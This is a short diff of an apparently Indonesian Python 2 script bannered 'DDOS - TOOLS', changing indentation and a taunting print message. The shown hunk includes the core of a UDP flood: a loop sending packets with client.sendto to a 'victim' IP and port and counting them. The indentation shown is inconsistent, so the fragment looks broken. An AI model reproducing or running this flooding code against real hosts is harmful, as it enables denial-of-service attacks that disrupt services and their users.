@@ -7,7 +7,7 @@ import random
 import time
 import os
 
-    def usage( ) :
+      def usage() :
            print  " ========================== "
            print  "     DDOS - TOOLS - BY-S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿    "
            print  " iii III III        IIII III III            IIIIIIIIII "
@@ -34,7 +34,7 @@ import os
             pass
         client.sendto(bytes, (victim, vport))
         sent = sent + 1
-        print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena disenggol %s IP | PORT %s "%(sent, victim, vport)
+        print " Remake By S̵̈́̓U̸̿̈́T̴̿͆E̵͛̒J̴̽͘O̴͑̿ %s Cie kena senggol %s IP | PORT %s "%(sent, victim, vport)
 
     def main():
     print len(sys.argv)
